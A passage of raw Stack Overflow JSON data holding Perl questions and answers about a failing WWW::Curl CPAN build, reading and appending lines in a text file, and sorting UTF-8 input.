acute accent in d\u00b4esir\u00b4ee, the circumflex in\nc\u02c6ote, the tilde in ma\u02dcnana, the macron in T\u00afokyo, the breve\nin russki\u02d8i, the dot above in \u02d9zaba, the dieresis (umlaut)\nin L\u00a8owenbr\u00a8au, the caron (hachek) in \u02c7crny, the circle\nabove (angstrom) in \u02daarbok, the ligature first and second\nhalves in d&amp;llig;i&amp;rlig;ad&amp;llig;i&amp;rlig;a, the high comma off\ncenter in rozdel&amp;rcommaa;ovac, the double acute in\nid\u02ddoszaki, the candrabindu (breve with dot above) in\nAli&amp;candra;iev, the cedilla in \u00b8ca va comme \u00b8ca, the right\nhook in viet\u02dba, the dot below in te&amp;dotb;da, the double dot\nbelow in &amp;under;k&amp;under;hu&amp;dbldotb;tbah, the circle below in\nSa&amp;dotb;msk&amp;ringb;rta, the double underscore in\n&amp;dblunder;Ghulam, the left hook in Lech Wa\u0142&amp;commab;esa, the\nright cedilla (comma below) in kh\u0157ong, the upadhmaniya (half\ncircle below) in &amp;breveb;humantu\u02c7s, double tilde, first and\nsecond halves in &amp;ldbltil;n&amp;rdbltil;galan, high comma\n(centered) in g&amp;commaa;eotermika.\n</code></pre>\n"}, {"tags": ["perl", "curl", "cpan"], "comments": [{"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1520767730, "post_id": 49219445, "comment_id": 85442594, "body": "Check CpanTesters to see if that combo has been built successfully: <a href=\"http://matrix.cpantesters.org/?dist=WWW-Curl+4.17\" rel=\"nofollow noreferrer\">matrix.cpantesters.org/?dist=WWW-Curl+4.17</a>    Do you have libcurl already installed?"}, {"owner": {"reputation": 1220, "user_id": 1520793, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/d0155363af97f63765cf92e647adb003?s=128&d=identicon&r=PG", "display_name": "sotona", "link": "https://stackoverflow.com/users/1520793/sotona"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1520767853, "post_id": 49219445, "comment_id": 85442613, "body": "I have libcurl/7.58.0 installed"}, {"owner": {"reputation": 2422, "user_id": 9112798, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e2689048404de2b747c712b6782e8c7?s=128&d=identicon&r=PG&f=1", "display_name": "David Collins", "link": "https://stackoverflow.com/users/9112798/david-collins"}, "edited": false, "score": 0, "creation_date": 1520769904, "post_id": 49219445, "comment_id": 85443147, "body": "Do you have the actual development headers for libcurl installed - or just the shared library? I.e. is there a &#39;curl.h&#39; file in /usr/local/include/curl/ or /usr/include/curl/ ?"}, {"owner": {"reputation": 1220, "user_id": 1520793, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/d0155363af97f63765cf92e647adb003?s=128&d=identicon&r=PG", "display_name": "sotona", "link": "https://stackoverflow.com/users/1520793/sotona"}, "edited": false, "score": 0, "creation_date": 1520770033, "post_id": 49219445, "comment_id": 85443192, "body": "Of course. There is curl.h at /usr/local/include/curl and it has all the necessary definitions. I&#39;ll try to review makefile generated for WWW::Curl"}, {"owner": {"reputation": 18919, "user_id": 891440, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/dd366bcdcf85991fa8af1b6d11d3ad49?s=128&d=identicon&r=PG", "display_name": "jjmerelo", "link": "https://stackoverflow.com/users/891440/jjmerelo"}, "edited": false, "score": 0, "creation_date": 1520948604, "post_id": 49219445, "comment_id": 85518530, "body": "What version of cc are you using?"}, {"owner": {"reputation": 1220, "user_id": 1520793, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/d0155363af97f63765cf92e647adb003?s=128&d=identicon&r=PG", "display_name": "sotona", "link": "https://stackoverflow.com/users/1520793/sotona"}, "reply_to_user": {"reputation": 18919, "user_id": 891440, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/dd366bcdcf85991fa8af1b6d11d3ad49?s=128&d=identicon&r=PG", "display_name": "jjmerelo", "link": "https://stackoverflow.com/users/891440/jjmerelo"}, "edited": false, "score": 0, "creation_date": 1520972796, "post_id": 49219445, "comment_id": 85533936, "body": "@jjmerelo FreeBSD clang version 4.0.0 (tags/RELEASE_400/final 297347) (based on LLVM 4.0.0)"}, {"owner": {"reputation": 1220, "user_id": 1520793, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/d0155363af97f63765cf92e647adb003?s=128&d=identicon&r=PG", "display_name": "sotona", "link": "https://stackoverflow.com/users/1520793/sotona"}, "reply_to_user": {"reputation": 18919, "user_id": 891440, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/dd366bcdcf85991fa8af1b6d11d3ad49?s=128&d=identicon&r=PG", "display_name": "jjmerelo", "link": "https://stackoverflow.com/users/891440/jjmerelo"}, "edited": false, "score": 0, "creation_date": 1520973007, "post_id": 49219445, "comment_id": 85534047, "body": "@jjmerelo the same with gcc 4.8.5 and gcc 6.4.0"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1521009478, "post_id": 49219445, "comment_id": 85545235, "body": "<code>install WWW::Curl</code> is Perl code that uses a bareword as a string. This syntax will bite you if you ever try to install/upgrade a module that&#39;s used by <code>CPAN</code> internally. Prefer <code>install &quot;WWW:::Curl&quot;</code> or <code>install(&quot;WWW::Curl&quot;)</code>. Or just use the actual <code>cpan</code> script instead of an ad-hoc <code>perl -e ...</code> one-liner: <code>cpan WWW::Curl</code>."}], "answers": [{"comments": [{"owner": {"reputation": 1220, "user_id": 1520793, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/d0155363af97f63765cf92e647adb003?s=128&d=identicon&r=PG", "display_name": "sotona", "link": "https://stackoverflow.com/users/1520793/sotona"}, "edited": false, "score": 1, "creation_date": 1521013079, "post_id": 49271045, "comment_id": 85546820, "body": "In my case this was line 130 and the final condition looked like <code>if($e =~ &#47;(OBSOLETE|^CURL_EXTERN|_LAST\\z|_LASTENTRY\\z|CURL_DID_MEMORY&zwnj;&#8203;_FUNC_TYPEDEFS\\z|CUR&zwnj;&#8203;L_STRICTER\\z)&#47;) {</code>  Anyway it worked. Thanks a lot!"}], "tags": [], "owner": {"reputation": 18919, "user_id": 891440, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/dd366bcdcf85991fa8af1b6d11d3ad49?s=128&d=identicon&r=PG", "display_name": "jjmerelo", "link": "https://stackoverflow.com/users/891440/jjmerelo"}, "is_accepted": true, "score": 2, "last_activity_date": 1521008936, "creation_date": 1521008936, "answer_id": 49271045, "question_id": 49219445, "link": "https://stackoverflow.com/questions/49219445/wwwcurl-installation-via-cpan-fails-with-multiple-errors/49271045#49271045", "title": "WWW::Curl installation via CPAN fails with multiple errors", "body": "<p>There seems to be an open issue in <a href=\"https://github.com/szbalint/WWW--Curl/issues/16\" rel=\"nofollow noreferrer\">the module repository</a>. It's not closed, but you might want to follow it since there might be a fix in the upcoming releases or in the repo itself. The fix <a href=\"https://github.com/szbalint/WWW--Curl/issues/16#issuecomment-222556096\" rel=\"nofollow noreferrer\">might be</a></p>\n\n<pre><code>if ($e =~ /(OBSOLETE|^CURL_EXTERN|_LAST\\z|_LASTENTRY\\z|CURL_DID_MEMORY_FUNC_TYPEDEFS\\z)/) {\n</code></pre>\n\n<p>in line 140 of Makefile.PL</p>\n"}], "owner": {"reputation": 1220, "user_id": 1520793, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/d0155363af97f63765cf92e647adb003?s=128&d=identicon&r=PG", "display_name": "sotona", "link": "https://stackoverflow.com/users/1520793/sotona"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 235, "favorite_count": 0, "accepted_answer_id": 49271045, "answer_count": 1, "score": 1, "last_activity_date": 1521008936, "creation_date": 1520767440, "question_id": 49219445, "link": "https://stackoverflow.com/questions/49219445/wwwcurl-installation-via-cpan-fails-with-multiple-errors", "title": "WWW::Curl installation via CPAN fails with multiple errors", "body": "<p>I tried to install WWW::Curl like <code>perl -MCPAN -e 'install WWW::Curl'</code>.\nDuring <code>Curl.xs</code> build I get the following errors:</p>\n\n<blockquote>\n  <p>cc -c  -I/usr/local/include  -DHAS_FPSETMASK -DHAS_FLOATINGPOINT_H\n  -fno-strict-aliasing -pipe -fstack-protector-strong -I/usr/local/include -D_FORTIFY_SOURCE=2 -O2 -pipe -fstack-protector -fno-strict-aliasing    -DVERSION=\\\"4.17\\\"  -DXS_VERSION=\\\"4.17\\\" -DPIC -fPIC \"-I/usr/local/lib/perl5/5.24/mach/CORE\"   Curl.c In file included from Curl.xs:574:</p>\n  \n  <p>./curlopt-constants.c:19:58: error:</p>\n  \n  <p>non-void function 'constant' should return a value [-Wreturn-type]\n              if (strEQ(name, \"DID_MEMORY_FUNC_TYPEDEFS\")) return CURL_DID_MEMORY_FUNC_TYPEDEFS;</p>\n  \n  <p>./curlopt-constants.c:136:49: error: use of undeclared identifier</p>\n  \n  <p>'CURL_STRICTER'\n              if (strEQ(name, \"STRICTER\")) return CURL_STRICTER;</p>\n</blockquote>\n\n<p>And a lot of warnings after that.</p>\n\n<p>Is there anything I'm missing?</p>\n\n<p>I tried to build <code>WWW::Curl</code> with perl 5.24.3, on FreeBSD 11.1</p>\n"}, {"tags": ["regex", "string", "perl"], "comments": [{"owner": {"reputation": 28698, "user_id": 8380272, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-3ZL-hcLCA44/AAAAAAAAAAI/AAAAAAAAAag/L1xahsLXycQ/photo.jpg?sz=128", "display_name": "Onyambu", "link": "https://stackoverflow.com/users/8380272/onyambu"}, "edited": false, "score": 0, "creation_date": 1520739409, "post_id": 49216263, "comment_id": 85436789, "body": "Which language is this?"}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 1, "creation_date": 1520739729, "post_id": 49216263, "comment_id": 85436849, "body": "You are trying to read from a file that you opened in append mode..."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 28698, "user_id": 8380272, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-3ZL-hcLCA44/AAAAAAAAAAI/AAAAAAAAAag/L1xahsLXycQ/photo.jpg?sz=128", "display_name": "Onyambu", "link": "https://stackoverflow.com/users/8380272/onyambu"}, "edited": false, "score": 0, "creation_date": 1520740029, "post_id": 49216263, "comment_id": 85436893, "body": "@Onyambu: Check the tags on the question"}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1520847026, "post_id": 49216263, "comment_id": 85467036, "body": "Always <code>use strict; use warnings;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520777126, "post_id": 49216434, "comment_id": 85445196, "body": "When I use &quot;use strict;&quot; I get an internal server error every time so I can&#39;t use it for some reason. Is something not installed for this? &quot;use warnings &#39;all&#39;; did not do anything on its own. the program ran but without the right output."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520777919, "post_id": 49216434, "comment_id": 85445457, "body": "@user:  You didn&#39;t mention that this is a CGI app! The &quot;internal server error&quot; is because your program is invalid with <code>use strict</code> in place and it just dies during compilation. That&#39;s a good thing! Read your server log (or <code>use CGI::Carp qw(fatalsToBrowser)</code> or just run your program from the command line) to reveal the errors that it has uncovered. It will probably be a missing declaration. <i>Never</i> remove <code>use strict</code> to get your program working: it is counter-productive."}, {"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520801454, "post_id": 49216434, "comment_id": 85453516, "body": "there is too much info being passed from the web form to do it via command line. adding <b>use CGI::Carp qw(fatalsToBrowser)</b> also causes an internal server error. didn&#39;t know it made a difference that it was a cgi app."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520803480, "post_id": 49216434, "comment_id": 85454140, "body": "@user: Okay, and what happened when you ran it from the command line, and what is in the server log?"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1520739889, "creation_date": 1520739889, "answer_id": 49216434, "question_id": 49216263, "link": "https://stackoverflow.com/questions/49216263/need-to-check-if-a-string-is-present-if-not-write-it-to-the-text-file/49216434#49216434", "title": "need to check if a string is present. if not, write it to the text file", "body": "<p>You are trying to read from a file handle <code>REG</code> that you have opened for output</p>\n\n<p>You are also reading into array <code>@line</code> and then working with the contents of <code>@lines</code></p>\n\n<p>You <em>must always</em></p>\n\n<pre><code>use strict;\nuse warnings 'all';\n</code></pre>\n\n<p>at the top of every Perl program you write</p>\n"}, {"tags": [], "owner": {"reputation": 13167, "user_id": 546205, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5d7dd187ae1f4400664cbc0e66c8a2ce?s=128&d=identicon&r=PG", "display_name": "Miguel Prz", "link": "https://stackoverflow.com/users/546205/miguel-prz"}, "is_accepted": false, "score": 4, "last_activity_date": 1520754848, "creation_date": 1520754848, "answer_id": 49217856, "question_id": 49216263, "link": "https://stackoverflow.com/questions/49216263/need-to-check-if-a-string-is-present-if-not-write-it-to-the-text-file/49217856#49217856", "title": "need to check if a string is present. if not, write it to the text file", "body": "<p>You should handle two files</p>\n\n<p>First one, for read purposes (<code>$fh_reg</code> on \"REG/reglist.txt\"). Note the '&lt;' read mode:</p>\n\n<pre><code>open my $fh_reg, '&lt;', \"REG/reglist.txt\" or die $!;\n</code></pre>\n\n<p>Second one, is a temporary file (<code>$fh_temp</code>) used to write the desired output. The <a href=\"https://perldoc.perl.org/File/Temp.html\" rel=\"nofollow noreferrer\">File::Temp</a> module may help you a lot:</p>\n\n<pre><code>use File::Temp qw/tempfile/;\n# ...\nmy ($fh_temp, $filename_temp) = tempfile();\n</code></pre>\n\n<p>And finally, <a href=\"http://perldoc.perl.org/functions/rename.html\" rel=\"nofollow noreferrer\">rename</a> this file as the first one.</p>\n\n<pre><code>rename $filename_temp, \"REG/reglist.txt\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520801609, "post_id": 49222045, "comment_id": 85453577, "body": "i was able to open and read it ok with &quot;&lt;$regfile&quot; (no + sign). my problem seems to be that it does not recognize that the line already exists still, like I have the code wrong to see if the line is there. each line would look like:  Joe Cool:::12345\\r  I tried <b>eq $find</b> and also <b>=~ /$find/</b> but neither seems to recognize it."}], "tags": [], "owner": {"reputation": 26, "user_id": 9475427, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NlA1u.jpg?s=128&g=1", "display_name": "Tom Chmielarz", "link": "https://stackoverflow.com/users/9475427/tom-chmielarz"}, "is_accepted": false, "score": 1, "last_activity_date": 1520784218, "creation_date": 1520784218, "answer_id": 49222045, "question_id": 49216263, "link": "https://stackoverflow.com/questions/49216263/need-to-check-if-a-string-is-present-if-not-write-it-to-the-text-file/49222045#49222045", "title": "need to check if a string is present. if not, write it to the text file", "body": "<p>you need to open the file for read/write access.</p>\n\n<p>Note: '+&lt;' will open file for updates. '+>' will overwrite and would defeat what you are attempting.</p>\n\n<p>The following edit should do it:</p>\n\n<pre><code>open(REG,\"+&lt;$regfile\") or fail();\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520803581, "post_id": 49225084, "comment_id": 85454163, "body": "I wrote exactly that in my own answer."}], "tags": [], "owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "is_accepted": false, "score": -1, "last_activity_date": 1520802365, "creation_date": 1520802365, "answer_id": 49225084, "question_id": 49216263, "link": "https://stackoverflow.com/questions/49216263/need-to-check-if-a-string-is-present-if-not-write-it-to-the-text-file/49225084#49225084", "title": "need to check if a string is present. if not, write it to the text file", "body": "<p>After fixing the less than sign before $regfile i figured out it was simply a typo. I was declaring <strong>@line</strong> but trying to read the array <strong>@lines</strong>. working now. thanks all!</p>\n"}], "owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1520802365, "creation_date": 1520737937, "question_id": 49216263, "link": "https://stackoverflow.com/questions/49216263/need-to-check-if-a-string-is-present-if-not-write-it-to-the-text-file", "title": "need to check if a string is present. if not, write it to the text file", "body": "<p>Trying to write to a text file that has a list of names and serial numbers. each one will be on a separate line. if the name:::number is there already, it shouldn't write it, but it can't seem to find one that's already there, so it rewrites it. Here is my code:</p>\n\n<pre><code>$regfile = \"REG/reglist.txt\";\n$find = $name.\":::\".$serial.\"\\n\";\n$index = 0;\n\nopen(REG,\"&gt;&gt;$regfile\") or fail();\n\nmy @line = &lt;REG&gt;;\n\nforeach $line (@lines) {\n    if ($line eq $find) {\n        $index++;\n    } \n}\n\nif ($index == 0) {\n    print REG \"$find\";\n} else { \n    print REG \"was already there.\\n\"; \n}\n\nclose(REG);\n</code></pre>\n"}, {"tags": ["perl", "utf-8"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1520725334, "post_id": 49215163, "comment_id": 85434558, "body": "How do you open the file? How do you read the lines?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1520725377, "post_id": 49215163, "comment_id": 85434562, "body": "What order do you expect for Latin versus Cyrillic words?"}, {"owner": {"reputation": 41, "user_id": 9473574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c4c34059cb7ab18676c991de8f945b2?s=128&d=identicon&r=PG&f=1", "display_name": "D.123perl456", "link": "https://stackoverflow.com/users/9473574/d-123perl456"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520725513, "post_id": 49215163, "comment_id": 85434579, "body": "open(FILE, &quot;$address&quot;) or die &quot;Can&#39;t open file: $!\\n&quot;; my @file = &lt;FILE&gt;; close (FILE);"}, {"owner": {"reputation": 41, "user_id": 9473574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c4c34059cb7ab18676c991de8f945b2?s=128&d=identicon&r=PG&f=1", "display_name": "D.123perl456", "link": "https://stackoverflow.com/users/9473574/d-123perl456"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520725618, "post_id": 49215163, "comment_id": 85434598, "body": "in Latin versus my lines are sorted alphabetically."}, {"owner": {"reputation": 7502, "user_id": 6368697, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yq4cG.jpg?s=128&g=1", "display_name": "Patrick Mevzek", "link": "https://stackoverflow.com/users/6368697/patrick-mevzek"}, "edited": false, "score": 0, "creation_date": 1520726935, "post_id": 49215163, "comment_id": 85434812, "body": "Which Perl version?"}, {"owner": {"reputation": 41, "user_id": 9473574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c4c34059cb7ab18676c991de8f945b2?s=128&d=identicon&r=PG&f=1", "display_name": "D.123perl456", "link": "https://stackoverflow.com/users/9473574/d-123perl456"}, "edited": false, "score": 0, "creation_date": 1520728623, "post_id": 49215163, "comment_id": 85435080, "body": "I use version 5.016"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1520731795, "post_id": 49215163, "comment_id": 85435627, "body": "Where&#39;s the rest of the demonstration of the problem??? What problem are you having???"}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 2, "last_activity_date": 1520726163, "creation_date": 1520726163, "answer_id": 49215241, "question_id": 49215163, "link": "https://stackoverflow.com/questions/49215163/sorting-utf-8-input/49215241#49215241", "title": "Sorting UTF-8 input", "body": "<p>To open a file saved as UTF-8, use the appropriate layer:</p>\n\n<pre><code>open my $FH, '&lt;:encoding(UTF-8)', 'filename' or die $!;\n</code></pre>\n\n<p>Don't forget to set the same layer for the output.</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\nbinmode *DATA, ':encoding(UTF-8)';\nbinmode *STDOUT, ':encoding(UTF-8)';\nprint for sort &lt;DATA&gt;;\n\n__DATA__\n\u0411\u043e\u0440\u0438\u0441\nPeter\nJohn\n\u0412\u043b\u0430\u0434\u0438\u043c\u0438\u0440\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1520732350, "post_id": 49215255, "comment_id": 85435711, "body": "Or you can use <code>open pragma</code> for all standard streams"}], "tags": [], "owner": {"reputation": 1672, "user_id": 4355253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee8cbfecfb7686f370b07eea52273c5?s=128&d=identicon&r=PG&f=1", "display_name": "Javier Elices", "link": "https://stackoverflow.com/users/4355253/javier-elices"}, "is_accepted": false, "score": 1, "last_activity_date": 1520787736, "last_edit_date": 1520787736, "creation_date": 1520726261, "answer_id": 49215255, "question_id": 49215163, "link": "https://stackoverflow.com/questions/49215163/sorting-utf-8-input/49215255#49215255", "title": "Sorting UTF-8 input", "body": "<p>The key to handle UTF-8 correctly in Perl is to make sure that Perl knows that a certain source or destination of information is in UTF-8. This is done differently depending on the way you get info in or out. If the UTF-8 is coming from an input file, the way to open the file is:</p>\n\n<pre><code>open( my $fh, '&lt;:encoding(UTF-8)', \"filename\" ) or die \"Cannot open file: $!\\n\";\n</code></pre>\n\n<p>If you are going to have UTF-8 inside the source of your script, then make sure you have:</p>\n\n<pre><code>use utf8;\n</code></pre>\n\n<p>At the beginning of the script.</p>\n\n<p>If you are going to get UTF-8 characters from <code>STDIN</code>, use this at the beginning of the script:</p>\n\n<pre><code>binmode(STDIN, ':encoding(UTF-8)');\n</code></pre>\n\n<p>For <code>STDOUT</code> use:</p>\n\n<pre><code>binmode(STDOUT, ':encoding(UTF-8)');\n</code></pre>\n\n<p>Also, make sure you read <a href=\"https://perldoc.perl.org/Encode.html#UTF-8-vs.-utf8-vs.-UTF8\" rel=\"nofollow noreferrer\">UTF-8 vs. utf8 vs. UTF8</a> to know the difference between each encoding name. <code>utf8</code> or <code>UTF8</code> will allow valid UTF-8 and also non-valid UTF-8 (according to the first UTF-8 proposed standard) and will not complain about non-valid codepoints. <code>UTF-8</code> will allow valid UTF-8 but will not allow non-valid codepoint combinations; it is a short name for <code>utf-8-strict</code>. You may also read the question <a href=\"https://stackoverflow.com/questions/6234386/how-do-i-sanitize-invalid-utf-8-in-perl\">How do I sanitize invalid UTF-8 in Perl?\n</a>.</p>\n\n<p>Finally, following @zdim advise, you may use at the beginning of the script:</p>\n\n<pre><code>use open ':encoding(UTF-8)';\n</code></pre>\n\n<p>And other variants as described <a href=\"https://perldoc.perl.org/open.html\" rel=\"nofollow noreferrer\">here</a>. That will set the encoding layer for all <code>open</code> instructions that do not specify a layer explicitly.</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520732753, "post_id": 49215736, "comment_id": 85435768, "body": "<i>&quot;The <code>cmp</code> used with <code>sort</code> can&#39;t help with this; it has no notion of encodings and merely compares character by character&quot;</i> I would have thought that was exactly what you wanted as long as the strings aren&#39;t encoded."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520732931, "post_id": 49215736, "comment_id": 85435792, "body": "@Borodin  But with strings that come from an encoding other than ascii that will result in a wrong sort?  The linked post is a good example of this problem, I think."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 